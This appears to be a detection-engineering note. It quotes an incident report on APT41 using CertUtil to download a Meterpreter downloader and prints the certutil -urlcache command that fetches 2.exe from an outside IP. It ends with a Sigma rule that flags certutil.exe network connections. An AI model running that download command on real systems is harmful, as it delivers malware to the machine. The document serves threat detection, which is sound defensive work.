### certutil

    Within a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor with a different C2 address that uses Microsoft CertUtil, a common TTP that we've observed APT41 use in past intrusions, which they then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The file 2.exe was a VMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The usage of VMProtected binaries is another very common TTP that we've observed this group leverage in multiple intrusions in order to delay analysis of other tools in their toolkit.

```sh
certutil -urlcache -split -f http://91.208.184[.]78/2.exe
```

### sigma rule

```yaml
title: Uncommon Network Connection Initiated By Certutil.EXE
id: 0dba975d-a193-4ed1-a067-424df57570d1
status: test
description: |
    Detects a network connection initiated by the certutil.exe utility.
    Attackers can abuse the utility in order to download malware or additional payloads.
references:
    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
author: frack113, Florian Roth (Nextron Systems)
date: 2022-09-02
modified: 2024-05-31
tags:
    - attack.command-and-control
    - attack.t1105
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        Image|endswith: '\certutil.exe'
        Initiated: 'true'
        DestinationPort:
            - 80
            - 135
            - 443
            - 445
    condition: selection
falsepositives:
    - Unknown
level: high
```
